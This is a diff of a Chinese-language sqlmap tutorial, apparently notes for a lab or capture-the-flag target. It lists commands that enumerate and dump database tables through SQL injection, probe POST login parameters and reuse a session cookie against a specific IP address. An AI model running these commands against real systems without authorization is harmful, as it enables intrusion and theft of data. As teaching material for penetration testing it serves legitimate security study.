@@ -29,8 +29,8 @@ $ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 -D cyber --tables
 # 指定注入点，指定数据库名和表名，查看表中具体内容
 $ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 -D cyber -T cyber --dump
 
-# 利用 POST 参数进行探测, search 为参数
-$ sqlmap -u http://223.112.5.156:59050/ --data=search=1  --current-db
+# 利用 POST 参数进行探测, 使用 --data 方式指定参数
+$ sqlmap -u http://223.112.5.156:59050/ --data="usr=admin&pass=admin"  --current-db
 
 # 当网站需要认证时，需要带上 Cookie ，可以利用 --cookie 参数
 $ sqlmap -u http://223.112.5.156:59050/index.php\?module\=index\&do\=member\&uid\=5  --level 2 --time-sec=10 --cookie "user=b73565ee4c6fd8009b9226e76d691d06; PHPSESSID=o5psg7sv53froq22u789dggbp0"
